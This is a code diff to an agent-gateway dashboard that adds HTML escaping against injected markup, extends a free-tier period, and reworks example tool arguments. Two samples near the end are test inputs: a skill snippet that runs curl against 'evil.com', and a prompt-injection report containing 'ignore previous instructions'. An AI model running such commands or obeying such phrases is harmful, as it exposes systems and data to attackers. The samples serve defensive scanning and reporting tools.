@@ -112,7 +112,7 @@ class WhiteMarchManager:
             return True, remaining, "FREE_TIER_GRANTED"
 
 
-A2A_WHITE_MARCH_DAYS = int(os.getenv("A2A_WHITE_MARCH_DAYS", "3"))
+A2A_WHITE_MARCH_DAYS = int(os.getenv("A2A_WHITE_MARCH_DAYS", "14"))
 A2A_WHITE_MARCH_DAILY_LIMIT = int(os.getenv("A2A_WHITE_MARCH_DAILY_LIMIT", "20"))
 
 white_march = WhiteMarchManager(
@@ -2354,6 +2354,21 @@ DASHBOARD_HTML = """<!DOCTYPE html>
     let allTools = [];
     let currentCategory = 'ALL';
 
+    function esc(s) {
+      if (s === null || s === undefined) return '';
+      return String(s)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    function setTxt(id, val) {
+      const el = document.getElementById(id);
+      if (el) el.innerText = val;
+    }
+
     function setCategory(cat) {
       currentCategory = cat;
       document.querySelectorAll('.filter-btn').forEach(btn => {
@@ -2371,15 +2386,19 @@ DASHBOARD_HTML = """<!DOCTYPE html>
     }
 
     function renderToolsTable() {
-      const query = (document.getElementById('tool-search').value || '').toLowerCase().trim();
+      const query = (document.getElementById('tool-search')?.value || '').toLowerCase().trim();
       const filtered = allTools.filter(t => {
         const matchesCat = (currentCategory === 'ALL' || t.category === currentCategory);
-        const matchesQuery = !query || t.name.toLowerCase().includes(query) || (t.category && t.category.toLowerCase().includes(query)) || (t.description && t.description.toLowerCase().includes(query));
+        const matchesQuery = !query || 
+          (t.name && t.name.toLowerCase().includes(query)) || 
+          (t.category && t.category.toLowerCase().includes(query)) || 
+          (t.description && t.description.toLowerCase().includes(query));
         return matchesCat && matchesQuery;
       });
 
       const maxInvocations = Math.max(...allTools.map(t => t.invocations || 0), 1);
       const tbody = document.getElementById('tools-tbody');
+      if (!tbody) return;
 
       if (filtered.length === 0) {
         tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:var(--muted); padding:2rem;">No se encontraron herramientas con los filtros seleccionados.</td></tr>';
@@ -2387,13 +2406,14 @@ DASHBOARD_HTML = """<!DOCTYPE html>
       }
 
       tbody.innerHTML = filtered.map(t => {
-        const pct = Math.min(100, Math.round(((t.invocations || 0) / maxInvocations) * 100));
+        const inv = t.invocations || 0;
+        const pct = Math.min(100, Math.round((inv / maxInvocations) * 100));
         let badgeClass = 'badge-standby';
         let badgeLabel = 'STANDBY';
-        if (t.invocations >= 5) {
+        if (inv >= 5) {
           badgeClass = 'badge-hot';
           badgeLabel = 'HOT';
-        } else if (t.invocations > 0) {
+        } else if (inv > 0) {
           badgeClass = 'badge-active';
           badgeLabel = 'ACTIVE';
         }
@@ -2401,21 +2421,21 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         return `
           <tr>
             <td>
-              <code>${t.name}</code>
-              <div style="font-size:0.72rem; color:var(--muted); margin-top:2px;">${t.description}</div>
+              <code>${esc(t.name)}</code>
+              <div style="font-size:0.72rem; color:var(--muted); margin-top:2px;">${esc(t.description)}</div>
             </td>
-            <td><span class="badge-cat">${t.category}</span></td>
+            <td><span class="badge-cat">${esc(t.category)}</span></td>
             <td>
               <div class="meter-container">
-                <span style="font-weight:700; min-width:24px;">${t.invocations}</span>
+                <span style="font-weight:700; min-width:24px;">${esc(inv)}</span>
                 <div class="meter-bar">
-                  <div class="meter-fill ${t.invocations >= 5 ? 'hot' : ''}" style="width: ${Math.max(pct, t.invocations > 0 ? 8 : 0)}%;"></div>
+                  <div class="meter-fill ${inv >= 5 ? 'hot' : ''}" style="width: ${Math.max(pct, inv > 0 ? 8 : 0)}%;"></div>
                 </div>
               </div>
             </td>
-            <td style="color:var(--muted); font-size:0.75rem;">${t.last_invoked}</td>
+            <td style="color:var(--muted); font-size:0.75rem;">${esc(t.last_invoked || 'Sin actividad')}</td>
             <td><span class="badge-status ${badgeClass}">${badgeLabel}</span></td>
-            <td style="color:#a5b4fc; font-size:0.75rem;">${t.pricing}</td>
+            <td style="color:#a5b4fc; font-size:0.75rem;">${esc(t.pricing || '100 sats')}</td>
           </tr>
         `;
       }).join('');
@@ -2447,79 +2467,72 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         }
         const data = await res.json();
         
-        // KPI Fila 1
-        document.getElementById('total-blocks').innerText = data.why_trail.total_blocks + ' Bloques';
-        document.getElementById('ledger-status').innerText = data.why_trail.status;
-        document.getElementById('agent-karma').innerText = data.moltbook.karma + ' Karma';
-        document.getElementById('agent-followers').innerText = data.moltbook.followers;
-        document.getElementById('agent-posts').innerText = data.moltbook.posts;
+        // KPI Fila 1 (Safe Property Access)
+        setTxt('total-blocks', (data.why_trail?.total_blocks ?? 0) + ' Bloques');
+        setTxt('ledger-status', data.why_trail?.status ?? 'ONLINE');
+        setTxt('agent-karma', (data.moltbook?.karma ?? 0) + ' Karma');
+        setTxt('agent-followers', data.moltbook?.followers ?? 0);
+        setTxt('agent-posts', data.moltbook?.posts ?? 0);
 
         // Flota Multi-Agente
         if (data.fleet) {
           if (data.fleet.primary) {
-            const elK1 = document.getElementById('agent1-karma');
-            if (elK1) elK1.innerText = data.fleet.primary.karma;
-            const elF1 = document.getElementById('agent1-followers');
-            if (elF1) elF1.innerText = data.fleet.primary.followers;
-            const elP1 = document.getElementById('agent1-posts');
-            if (elP1) elP1.innerText = data.fleet.primary.posts;
-            const elC1 = document.getElementById('agent1-comments');
-            if (elC1) elC1.innerText = data.fleet.primary.comments;
+            setTxt('agent1-karma', data.fleet.primary.karma ?? 0);
+            setTxt('agent1-followers', data.fleet.primary.followers ?? 0);
+            setTxt('agent1-posts', data.fleet.primary.posts ?? 0);
+            setTxt('agent1-comments', data.fleet.primary.comments ?? 0);
           }
           if (data.fleet.satellite) {
-            const elSt2 = document.getElementById('agent2-status');
-            if (elSt2) elSt2.innerText = data.fleet.satellite.status;
-            const elK2 = document.getElementById('agent2-karma');
-            if (elK2) elK2.innerText = data.fleet.satellite.karma;
-            const elP2 = document.getElementById('agent2-posts');
-            if (elP2) elP2.innerText = data.fleet.satellite.posts;
+            setTxt('agent2-status', data.fleet.satellite.status ?? 'STANDBY');
+            setTxt('agent2-karma', data.fleet.satellite.karma ?? 0);
+            setTxt('agent2-posts', data.fleet.satellite.posts ?? 0);
           }
         }
         const moltBadge = document.getElementById('moltbook-status-badge');
         if (moltBadge && data.moltbook) {
-          moltBadge.innerText = 'ACTIVO • ' + data.moltbook.karma + ' KARMA • 2 AGENTES';
+          moltBadge.innerText = 'ACTIVO • ' + (data.moltbook.karma ?? 0) + ' KARMA • 2 AGENTES';
         }
-        document.getElementById('active-tools').innerText = data.gateway.total_tools + ' Tools';
-        document.getElementById('white-march-days').innerText = data.gateway.white_march_days_left;
-        document.getElementById('reserve-sats').innerText = (data.insurance_and_vault.reserve_sats).toLocaleString() + ' sats';
-        document.getElementById('active-policies').innerText = data.insurance_and_vault.active_policies;
-        document.getElementById('secret-envelopes').innerText = data.insurance_and_vault.secret_envelopes;
+        setTxt('active-tools', (data.gateway?.total_tools ?? 45) + ' Tools');
+        setTxt('white-march-days', data.gateway?.white_march_days_left ?? 1);
+        setTxt('reserve-sats', (data.insurance_and_vault?.reserve_sats ?? 0).toLocaleString() + ' sats');
+        setTxt('active-policies', data.insurance_and_vault?.active_policies ?? 0);
+        setTxt('secret-envelopes', data.insurance_and_vault?.secret_envelopes ?? 0);
 
         // KPI Fila 2
-        document.getElementById('mcp-requests').innerText = (data.gateway.mcp_requests || 0).toLocaleString();
-        document.getElementById('tool-executions').innerText = (data.gateway.tool_executions || 0).toLocaleString();
-        document.getElementById('unique-callers').innerText = (data.gateway.unique_callers || 0) + ' Conectados';
-        document.getElementById('gateway-sla').innerText = data.gateway.success_rate || '100.0%';
-        document.getElementById('tools-badge').innerText = data.gateway.total_tools + ' TOOLS REGISTRADAS';
+        setTxt('mcp-requests', (data.gateway?.mcp_requests ?? 0).toLocaleString());
+        setTxt('tool-executions', (data.gateway?.tool_executions ?? 0).toLocaleString());
+        setTxt('unique-callers', (data.gateway?.unique_callers ?? 0) + ' Conectados');
+        setTxt('gateway-sla', data.gateway?.success_rate ?? '100.0%');
+        setTxt('tools-badge', (data.gateway?.total_tools ?? 45) + ' TOOLS REGISTRADAS');
 
-        // Telemetria de Herramientas
+        // Telemetría de Herramientas
         if (data.tools_telemetry) {
           allTools = data.tools_telemetry;
           renderToolsTable();
         }
 
-        // Agentes Clientes Conectados
+        // Agentes Clientes Conectados (Sanitizado)
         const callersTbody = document.getElementById('callers-tbody');
-        if (data.top_callers && data.top_callers.length > 0) {
-          document.getElementById('callers-count').innerText = data.top_callers.length + ' detectados';
+        if (callersTbody && data.top_callers && data.top_callers.length > 0) {
+          setTxt('callers-count', data.top_callers.length + ' detectados');
           callersTbody.innerHTML = data.top_callers.map(c => `
             <tr>
-              <td><code style="color:#e2e8f0;">${c.agent.length > 38 ? c.agent.substring(0, 38) + '...' : c.agent}</code></td>
-              <td><strong>${c.requests}</strong> reqs</td>
+              <td><code style="color:#e2e8f0;">${esc(c.agent.length > 38 ? c.agent.substring(0, 38) + '...' : c.agent)}</code></td>
+              <td><strong>${esc(c.requests)}</strong> reqs</td>
               <td><span class="badge-cat" style="font-size:0.65rem;">JSON-RPC 2.0</span></td>
             </tr>
           `).join('');
         }
 
-        // Eventos Causal Ledger
+        // Eventos Causal Ledger (Sanitizado)
         const tbody = document.getElementById('events-tbody');
-        if (data.recent_events && data.recent_events.length > 0) {
+        if (tbody && data.recent_events && data.recent_events.length > 0) {
           tbody.innerHTML = data.recent_events.slice(0, 8).map(e => `
             <tr>
-              <td><strong>#${e.index}</strong></td>
-              <td><span class="badge-event">${e.type}</span></td>
-              <td><code>${e.actor}</code></td>
-              <td style="color:var(--muted); font-size:0.75rem;">${e.timestamp}</td>
+              <td><strong>#${esc(e.index)}</strong></td>
+              <td><span class="badge-event">${esc(e.type)}</span></td>
+              <td><code>${esc(e.actor)}</code></td>
+              <td style="color:var(--muted); font-size:0.75rem;">${esc(e.timestamp)}</td>
             </tr>
           `).join('');
         }
@@ -2527,13 +2540,13 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         // Artifact Hub (Audios)
         if (data.artifacts && data.artifacts.audios) {
           const audiosTbody = document.getElementById('audios-tbody');
-          document.getElementById('audio-count').innerText = data.artifacts.audios.length + ' audios';
-          if (data.artifacts.audios.length > 0) {
+          setTxt('audio-count', (data.artifacts.audios.length || 0) + ' audios');
+          if (audiosTbody && data.artifacts.audios.length > 0) {
             audiosTbody.innerHTML = data.artifacts.audios.map(a => `
               <tr>
-                <td><code>${a.id}</code></td>
-                <td>${a.size_kb} KB</td>
-                <td><button class="filter-btn" style="color:#38bdf8; border-color:#38bdf8;" onclick="playAudio('${a.stream_url}')">▶ Escuchar</button></td>
+                <td><code>${esc(a.id)}</code></td>
+                <td>${esc(a.size_kb)} KB</td>
+                <td><button class="filter-btn" style="color:#38bdf8; border-color:#38bdf8;" onclick="playAudio('${encodeURI(a.stream_url)}')">▶ Escuchar</button></td>
               </tr>
             `).join('');
           }
@@ -2542,23 +2555,25 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         // Artifact Hub (Docs & Sheets)
         if (data.artifacts) {
           const docsTbody = document.getElementById('docs-tbody');
-          const docs = (data.artifacts.docs || []).map(d => `
-            <tr>
-              <td><code>${d.id}</code></td>
-              <td><span class="badge-cat">HTML Doc</span></td>
-              <td><a href="${d.view_url}" target="_blank" class="filter-btn" style="text-decoration:none; color:#10b981; border-color:#10b981;">Ver HTML</a></td>
-            </tr>
-          `);
-          const sheets = (data.artifacts.sheets || []).map(s => `
-            <tr>
-              <td><code>${s.id}</code></td>
-              <td><span class="badge-cat">CSV Sheet</span></td>
-              <td><a href="${s.download_url}" target="_blank" class="filter-btn" style="text-decoration:none; color:#fbbf24; border-color:#fbbf24;">Descargar</a></td>
-            </tr>
-          `);
-          const allArt = docs.concat(sheets);
-          if (allArt.length > 0) {
-            docsTbody.innerHTML = allArt.slice(0, 5).join('');
+          if (docsTbody) {
+            const docs = (data.artifacts.docs || []).map(d => `
+              <tr>
+                <td><code>${esc(d.id)}</code></td>
+                <td><span class="badge-cat">HTML Doc</span></td>
+                <td><a href="${encodeURI(d.view_url)}" target="_blank" class="filter-btn" style="text-decoration:none; color:#10b981; border-color:#10b981;">Ver HTML</a></td>
+              </tr>
+            `);
+            const sheets = (data.artifacts.sheets || []).map(s => `
+              <tr>
+                <td><code>${esc(s.id)}</code></td>
+                <td><span class="badge-cat">CSV Sheet</span></td>
+                <td><a href="${encodeURI(s.download_url)}" target="_blank" class="filter-btn" style="text-decoration:none; color:#fbbf24; border-color:#fbbf24;">Descargar</a></td>
+              </tr>
+            `);
+            const allArt = docs.concat(sheets);
+            if (allArt.length > 0) {
+              docsTbody.innerHTML = allArt.slice(0, 5).join('');
+            }
           }
         }
 
@@ -2573,30 +2588,29 @@ DASHBOARD_HTML = """<!DOCTYPE html>
           });
         }
 
-        // Moltbook Posts & Replies Feed
+        // Moltbook Posts & Replies Feed (Sanitizado)
         if (data.moltbook && data.moltbook.feed) {
           const postsContainer = document.getElementById('moltbook-posts-container');
           const repliesContainer = document.getElementById('moltbook-replies-container');
-          const postsCount = document.getElementById('moltbook-posts-count');
           const posts = data.moltbook.feed.posts || [];
           const replies = data.moltbook.feed.replies || [];
 
-          if (postsCount) postsCount.innerText = posts.length + ' Publicaciones';
+          setTxt('moltbook-posts-count', posts.length + ' Publicaciones');
 
           if (postsContainer && posts.length > 0) {
             postsContainer.innerHTML = posts.map(p => `
               <div style="background:#131824; border:1px solid var(--border); border-radius:6px; padding:0.75rem;">
                 <div style="display:flex; justify-content:space-between; align-items:flex-start; gap:0.5rem; margin-bottom:0.35rem;">
-                  <span style="font-size:0.7rem; background:#1e293b; color:#38bdf8; padding:0.15rem 0.4rem; border-radius:4px; font-weight:600;">t/${p.submolt}</span>
-                  <span style="font-size:0.7rem; color:var(--muted);">${p.created_at}</span>
+                  <span style="font-size:0.7rem; background:#1e293b; color:#38bdf8; padding:0.15rem 0.4rem; border-radius:4px; font-weight:600;">t/${esc(p.submolt)}</span>
+                  <span style="font-size:0.7rem; color:var(--muted);">${esc(p.created_at)}</span>
                 </div>
                 <div style="font-size:0.8rem; font-weight:700; color:#f1f5f9; margin-bottom:0.3rem;">
-                  <a href="${p.url}" target="_blank" style="color:#f1f5f9; text-decoration:none;">${p.title} ↗</a>
+                  <a href="${encodeURI(p.url)}" target="_blank" style="color:#f1f5f9; text-decoration:none;">${esc(p.title)} ↗</a>
                 </div>
-                <div style="font-size:0.73rem; color:var(--muted); line-height:1.35; margin-bottom:0.5rem;">${p.preview}</div>
+                <div style="font-size:0.73rem; color:var(--muted); line-height:1.35; margin-bottom:0.5rem;">${esc(p.preview)}</div>
                 <div style="display:flex; gap:0.75rem; font-size:0.7rem; color:#94a3b8;">
-                  <span>▲ ${p.upvotes} Upvotes</span>
-                  <span>💬 ${p.comments} Comentarios</span>
+                  <span>▲ ${esc(p.upvotes)} Upvotes</span>
+                  <span>💬 ${esc(p.comments)} Comentarios</span>
                 </div>
               </div>
             `).join('');
@@ -2606,54 +2620,68 @@ DASHBOARD_HTML = """<!DOCTYPE html>
             repliesContainer.innerHTML = replies.map(r => `
               <div style="background:#131824; border:1px solid var(--border); border-radius:6px; padding:0.75rem;">
                 <div style="display:flex; justify-content:space-between; align-items:flex-start; gap:0.5rem; margin-bottom:0.35rem;">
-                  <span style="font-size:0.7rem; background:#2e1065; color:#c084fc; padding:0.15rem 0.4rem; border-radius:4px; font-weight:600;">t/${r.submolt}</span>
-                  <span style="font-size:0.7rem; color:var(--muted);">${r.latest_at}</span>
+                  <span style="font-size:0.7rem; background:#2e1065; color:#c084fc; padding:0.15rem 0.4rem; border-radius:4px; font-weight:600;">t/${esc(r.submolt)}</span>
+                  <span style="font-size:0.7rem; color:var(--muted);">${esc(r.latest_at)}</span>
                 </div>
-                <div style="font-size:0.78rem; font-weight:700; color:#e2e8f0; margin-bottom:0.25rem;">${r.post_title}</div>
+                <div style="font-size:0.78rem; font-weight:700; color:#e2e8f0; margin-bottom:0.25rem;">${esc(r.post_title)}</div>
                 <div style="font-size:0.73rem; color:#94a3b8; margin-bottom:0.4rem;">
-                  <span style="color:#38bdf8; font-weight:600;">Interlocutores:</span> ${(r.commenters || []).map(c => '@' + c).join(', ')}
+                  <span style="color:#38bdf8; font-weight:600;">Interlocutores:</span> ${(r.commenters || []).map(c => '@' + esc(c)).join(', ')}
                 </div>
-                <div style="font-size:0.72rem; color:var(--muted); font-style:italic;">"${r.preview}"</div>
+                <div style="font-size:0.72rem; color:var(--muted); font-style:italic;">"${esc(r.preview)}"</div>
               </div>
             `).join('');
           }
         }
 
-        document.getElementById('last-sync').innerText = 'Sync: ' + new Date().toLocaleTimeString();
+        const syncEl = document.getElementById('last-sync');
+        if (syncEl) {
+          syncEl.innerText = 'Sync: ' + new Date().toLocaleTimeString();
+          syncEl.style.color = 'var(--muted)';
+        }
       } catch (err) {
         console.error('Error fetching dashboard telemetry:', err);
+        const syncEl = document.getElementById('last-sync');
+        if (syncEl) {
+          syncEl.innerText = '⚠️ Error Sync: Reintentando...';
+          syncEl.style.color = '#ef4444';
+        }
       }
     }
 
     function playAudio(url) {
       const p = document.getElementById('live-audio-player');
-      p.src = url;
-      p.play();
+      if (p) {
+        p.src = url;
+        p.play();
+      }
     }
 
     function updatePlaygroundTemplate() {
-      const tool = document.getElementById('playground-tool').value;
+      const tool = document.getElementById('playground-tool')?.value;
+      if (!tool) return;
       const templates = {
-        'get_alpha_intelligence_feed': '{"category_filter": "all"}',
-        'evaluate_financial_policy_proxy': '{"source_agent_id": "did:a2a:buyer-swarm", "destination_agent_id": "did:a2a:gpu-inference", "amount_sats": 2500, "session_spend_total_sats": 8000}',
-        'orchestrate_m2m_saga_transaction': '{"saga_id": "saga-compute-01", "steps": ["lock_collateral", "execute_inference", "settle_invoice"]}',
-        'enforce_chain_postconditions': '{"execution_trace_id": "trace-8891", "expected_state_hash": "sha256:7f83b..."}',
-        'certify_mcp_marketplace_package': '{"package_manifest_url": "https://clawhub.com/skills/bob-p2p-beta.json"}',
-        'certify_skill_safety': JSON.stringify({"skill_source_code": "import subprocess; subprocess.Popen(['curl', 'evil.com'])"}),
-        'request_l402_challenge': '{"price_sats": 25, "caveats": ["tool=compute_procedural_deadline"]}',
-        'compute_procedural_deadline': '{"start_date": "2026-11-20", "business_days": 15, "jurisdiction": "PJ_PERU"}',
-        'compute_us_procedural_deadline': '{"filing_date": "2026-11-20", "days_count": 21, "rule_set": "FRCP_RULE_6"}',
-        'validate_bluebook_citation': '{"citation": "Brown v. Board of Educ., 347 U.S. 483 (1954)"}',
-        'audit_us_contract_clauses': '{"contract_text": "Licensor liability shall not exceed $100...", "risk_threshold": "HIGH"}',
-        'audit_excel_macro_forensics': '{"file_data_base64": "UEsDBBQAAAAIA..."}',
-        'query_deep_context_archive': '{"agent_id": "admin", "archive_text_or_url": "Texto de prueba legal...", "query": "¿Cuál es la penalidad?"}',
-        'publish_enterprise_artifact': '{"agent_id": "admin", "title": "Doc Prueba", "markdown_content": "# Hola\\nContenido de prueba", "document_format": "STANDALONE_HTML"}',
-        'generate_audio_briefing': '{"agent_id": "admin", "source_transcript_or_report": "LOCUTOR A: Hola. LOCUTOR B: Como estas.", "briefing_format": "TWO_SPEAKER_DIALECTIC"}',
-        'sync_tabular_ledger': '{"agent_id": "admin", "spreadsheet_title": "Ledger Test", "rows_data": [{"col1": "val1"}]}',
-        'report_malicious_agent': '{"reporter_agent_id": "admin", "target_agent_id": "bad_bot_99", "threat_category": "PROMPT_INJECTION", "evidence_payload": "intento de injection ignore previous instructions", "severity": "SEV-HIGH"}',
-        'query_agent_threat_score': '{"target_agent_id": "bad_bot_99", "requesting_agent_id": "admin"}'
+        get_alpha_intelligence_feed: { category_filter: "all" },
+        evaluate_financial_policy_proxy: { source_agent_id: "did:a2a:buyer-swarm", destination_agent_id: "did:a2a:gpu-inference", amount_sats: 2500, session_spend_total_sats: 8000 },
+        orchestrate_m2m_saga_transaction: { saga_id: "saga-compute-01", steps: ["lock_collateral", "execute_inference", "settle_invoice"] },
+        enforce_chain_postconditions: { execution_trace_id: "trace-8891", expected_state_hash: "sha256:7f83b..." },
+        certify_mcp_marketplace_package: { package_manifest_url: "https://clawhub.com/skills/bob-p2p-beta.json" },
+        certify_skill_safety: { skill_source_code: "import subprocess; subprocess.Popen(['curl', 'evil.com'])" },
+        request_l402_challenge: { price_sats: 25, caveats: ["tool=compute_procedural_deadline"] },
+        compute_procedural_deadline: { start_date: "2026-11-20", business_days: 15, jurisdiction: "PJ_PERU" },
+        compute_us_procedural_deadline: { filing_date: "2026-11-20", days_count: 21, rule_set: "FRCP_RULE_6" },
+        validate_bluebook_citation: { citation: "Brown v. Board of Educ., 347 U.S. 483 (1954)" },
+        audit_us_contract_clauses: { contract_text: "Licensor liability shall not exceed $100...", risk_threshold: "HIGH" },
+        audit_excel_macro_forensics: { file_data_base64: "UEsDBBQAAAAIA..." },
+        query_deep_context_archive: { agent_id: "admin", archive_text_or_url: "Texto de prueba legal...", query: "¿Cuál es la penalidad?" },
+        publish_enterprise_artifact: { agent_id: "admin", title: "Doc Prueba", markdown_content: "# Hola - Contenido de prueba", document_format: "STANDALONE_HTML" },
+        generate_audio_briefing: { agent_id: "admin", source_transcript_or_report: "LOCUTOR A: Hola. LOCUTOR B: Como estas.", briefing_format: "TWO_SPEAKER_DIALECTIC" },
+        sync_tabular_ledger: { agent_id: "admin", spreadsheet_title: "Ledger Test", rows_data: [{ col1: "val1" }] },
+        report_malicious_agent: { reporter_agent_id: "admin", target_agent_id: "bad_bot_99", threat_category: "PROMPT_INJECTION", evidence_payload: "intento de injection ignore previous instructions", severity: "SEV-HIGH" },
+        query_agent_threat_score: { target_agent_id: "bad_bot_99", requesting_agent_id: "admin" }
       };
-      document.getElementById('playground-args').value = templates[tool] || '{"agent_id": "admin"}';
+      const payload = templates[tool] || { agent_id: "admin" };
+      const argsEl = document.getElementById('playground-args');
+      if (argsEl) argsEl.value = JSON.stringify(payload, null, 2);
     }
 
     async function executePlaygroundTool() {
